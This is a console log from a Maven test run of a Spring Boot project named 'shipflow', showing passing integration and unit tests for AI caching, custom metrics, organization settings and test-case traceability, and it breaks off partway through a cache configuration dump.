2026-01-17T23:26:47.358Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.360Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.360Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 1
2026-01-17T23:26:47.360Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.controller.AICacheController     : Cache invalidated for cycle 1
2026-01-17T23:26:47.362Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.362Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:47.362Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=false, TTL=infinite)
2026-01-17T23:26:47.363Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for pitch 1
2026-01-17T23:26:47.363Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.controller.AICacheController     : Cache invalidated for pitch 1
2026-01-17T23:26:47.363Z  WARN 89700 --- [shipflow] [           main] s.b.a.a.m.OnlyOnceLoggingDenyMeterFilter : Reached the maximum number of URI tags for 'http.server.requests'.
2026-01-17T23:26:47.365Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.365Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:47.367Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.368Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.368Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.controller.AICacheController     : Q&A cache cleared by user request
2026-01-17T23:26:47.370Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.372Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.372Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:47.372Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 2 (withAI=true, TTL=infinite)
2026-01-17T23:26:47.372Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
2026-01-17T23:26:47.372Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.controller.AICacheController     : All AI caches cleared by user request
2026-01-17T23:26:47.374Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
[INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.026 s -- in com.github.farzadsedaghatbin.shipflow.controller.AICacheControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.AuthControllerIntegrationTest
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.915 s -- in com.github.farzadsedaghatbin.shipflow.controller.AuthControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.ProjectControllerIntegrationTest
[INFO] Tests run: 14, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.074 s -- in com.github.farzadsedaghatbin.shipflow.controller.ProjectControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.CustomMetricControllerIntegrationTest
2026-01-17T23:26:48.375Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Updating metric 1 for user: 147
2026-01-17T23:26:48.375Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Updating custom metric 1 for user 147
2026-01-17T23:26:48.377Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Updated custom metric: 1
2026-01-17T23:26:48.383Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Fetching custom metrics for user: 148
2026-01-17T23:26:48.389Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Fetching metric 4 for user: 150
2026-01-17T23:26:48.390Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Security error: Not authorized to view this metric
2026-01-17T23:26:48.397Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Creating custom metric for user: 151
2026-01-17T23:26:48.397Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Unique Name' for user 151
2026-01-17T23:26:48.398Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Validation error: A metric with name 'Unique Name' already exists
2026-01-17T23:26:48.403Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Fetching metric 6 for user: 152
2026-01-17T23:26:48.408Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Creating custom metric for user: 153
2026-01-17T23:26:48.408Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Invalid Metric' for user 153
2026-01-17T23:26:48.408Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Validation error: Invalid formula: Unbalanced parentheses in formula
2026-01-17T23:26:48.413Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Calculating value for metric 7 (user: 154)
2026-01-17T23:26:48.413Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Calculating value for metric 7 (user: 154)
2026-01-17T23:26:48.420Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Fetching history for metric 8 (user: 155, limit: 10)
2026-01-17T23:26:48.427Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Fetching metric 999999 for user: 156
2026-01-17T23:26:48.427Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Validation error: Metric not found with id: 999,999
2026-01-17T23:26:48.431Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Creating custom metric for user: 157
2026-01-17T23:26:48.431Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Creating custom metric 'Velocity Metric' for user 157
2026-01-17T23:26:48.432Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Created custom metric with ID: 9
2026-01-17T23:26:48.437Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Deleting metric 10 for user: 158
2026-01-17T23:26:48.437Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Deleting custom metric 10 for user 158
2026-01-17T23:26:48.438Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.service.CustomMetricService      : Deleted custom metric: 10
2026-01-17T23:26:48.439Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Fetching metric 10 for user: 158
2026-01-17T23:26:48.439Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.c.CustomMetricController         : Validation error: Metric not found with id: 10
[INFO] Tests run: 11, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.075 s -- in com.github.farzadsedaghatbin.shipflow.controller.CustomMetricControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.DashboardNotificationControllerIntegrationTest
2026-01-17T23:26:48.454Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.DashboardNotificationService   : Marked 2 notifications as read for user 160
[INFO] Tests run: 8, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.038 s -- in com.github.farzadsedaghatbin.shipflow.controller.DashboardNotificationControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.OrganizationSettingsControllerIntegrationTest
2026-01-17T23:26:48.484Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Fetching organization settings
2026-01-17T23:26:48.490Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.490Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.492Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Fetching organization settings
2026-01-17T23:26:48.493Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Resetting organization settings to defaults by user: admin
2026-01-17T23:26:48.494Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings reset to defaults by admin
2026-01-17T23:26:48.495Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Fetching organization settings
2026-01-17T23:26:48.501Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Fetching organization settings
2026-01-17T23:26:48.507Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.507Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.508Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.509Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.514Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.515Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.522Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.523Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.524Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Resetting organization settings to defaults by user: admin
2026-01-17T23:26:48.524Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings reset to defaults by admin
2026-01-17T23:26:48.528Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.528Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.536Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.537Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.539Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Fetching organization settings
2026-01-17T23:26:48.542Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: specific-admin
2026-01-17T23:26:48.543Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by specific-admin
2026-01-17T23:26:48.546Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.547Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
2026-01-17T23:26:48.549Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.OrganizationSettingsController : Updating organization settings by user: admin
2026-01-17T23:26:48.550Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.OrganizationSettingsService    : Organization settings updated by admin
[INFO] Tests run: 16, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.071 s -- in com.github.farzadsedaghatbin.shipflow.controller.OrganizationSettingsControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.TestCaseTraceabilityTest
2026-01-17T23:26:48.977Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.TestCaseService   : Updated test case: TC-001 by user: 1
2026-01-17T23:26:48.990Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.TestCaseService   : Created test case: TC-050 by user: 1
2026-01-17T23:26:48.996Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.TestCaseService   : Updated test case: TC-001 by user: 1
2026-01-17T23:26:48.999Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.TestCaseService   : Created test case: TC-100 by user: 1
2026-01-17T23:26:49.001Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.TestCaseService   : Created test case: TC-001 by user: 1
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.450 s -- in com.github.farzadsedaghatbin.shipflow.service.TestCaseTraceabilityTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$CacheManagementTests
2026-01-17T23:26:49.002Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.003Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.003Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=infinite)
2026-01-17T23:26:49.003Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.004Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.004Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.004Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.004Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.005Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$CacheManagementTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$CacheStatisticsTests
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=2)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=3)
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.006Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 2 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_2_0_0, TTL=3 hours)
2026-01-17T23:26:49.006Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_3_0_0, TTL=3 hours)
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.001 s -- in com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$CacheStatisticsTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$QACacheTests
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.008Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_1_0_0, TTL=3 hours)
2026-01-17T23:26:49.008Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached Q&A response (context=pitch_2_0_0, TTL=3 hours)
2026-01-17T23:26:49.008Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:49.008Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Q&A cache exact hit (hits=1)
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.008Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
